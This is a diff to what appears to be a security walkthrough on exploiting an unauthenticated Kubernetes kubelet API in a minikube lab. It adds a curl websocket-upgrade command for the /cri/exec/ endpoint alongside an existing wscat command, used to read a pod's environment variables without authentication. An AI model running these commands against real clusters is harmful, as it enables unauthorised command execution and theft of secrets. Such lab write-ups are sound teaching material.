@@ -43,6 +43,19 @@ curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Strea
 ```
 wscat -c "https://<minikubeIP>:10250/cri/exec/<valueFrom302>" --no-check
 ```
+    
+You can use cURL too:
+```
+curl -k --include \
+     --no-buffer \
+     --header "Connection: Upgrade" \
+     --header "Upgrade: websocket" \
+     --header "Host: example.com:80" \
+     --header "Origin: http://example.com:80" \
+     --header "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
+     --header "Sec-WebSocket-Version: 13" \
+     https://<minikubeIP>:10250/cri/exec/<valueFrom302>
+```
 
 8. These are *all of the environment variables* for our unshorten-api pod, printed to the screen, unauthenticated. 
 
